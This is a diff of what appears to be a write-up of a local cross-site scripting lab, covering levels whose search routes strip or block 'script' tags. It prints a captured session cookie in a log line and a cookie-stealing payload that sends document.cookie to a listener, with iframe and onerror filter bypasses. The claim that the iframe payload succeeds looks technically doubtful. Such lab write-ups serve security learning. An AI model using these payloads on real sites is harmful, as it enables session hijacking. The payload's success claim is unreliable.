@@ -28,3 +28,51 @@
 
           => *Boom* "GET /lol?cookie=connect.sid=s%3Az5n3h8jDVEHvTkblMC-qvPFtVUk1YlRN.TjOKzCWWn3URo7g4f%2BgDlZNDsE3rBWFhSOf37hj%2FxMg HTTP/1.1" 404
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+       [LEVEL 2]-TARGET: http://localhost:13002
+
+       - There is a bit diff here in index.js:
+
+              ...
+               router.get('/search', function (req, res, next) {
+                sanitized_q = req.query.q.replace(/<script>|<\/script>/gi, ""); 
+                html = 'Your search - <b>' + sanitized_q + '</b> - did not match any notes.<br><br>'
+                res.send(html);
+              });
+              ...
+
+       => <script> or </script> tag will be replaced by "".
+       => we need to find tags that can have same function with script such as:
+              + <iframe src="{An injected URL}"></iframe>              // use iframe with src to inject sthg...
+              + <img src="error_image" onerror="alert("sthg here")">   // take advantage of error img.
+
+       - Use previous payload for this level:   <iframe src="const cookie = document.cookie; const cookiesteal = `http://localhost:12345/lol?cookie=${cookie}`;fetch(cookiesteal);"></iframe>
+       => *BOOM*
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+       [LEVEL 3]-TARGET: http://localhost:13003
+
+       - Just notice a little bit to index.js:
+
+            ...
+            router.get('/search', function (req, res, next) {
+                if (req.query.q.search(/script/i) > 0) {
+                    res.send('Hack detected');
+                    return;
+                }
+                html = 'Your search - <b>' + req.query.q + '</b> - did not match any notes.<br><br>'
+                res.send(html);
+            });
+            ...
+
+       => They still don't want us to use 'script' 
+       => So we just do like previous level(level 2) 
+       
+       => <iframe src="const cookie = document.cookie; const cookiesteal = `http://localhost:12345/lol?cookie=${cookie}`;fetch(cookiesteal);"></iframe>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+       [LEVEL 4]-TARGET: http://localhost:13004
+
+       
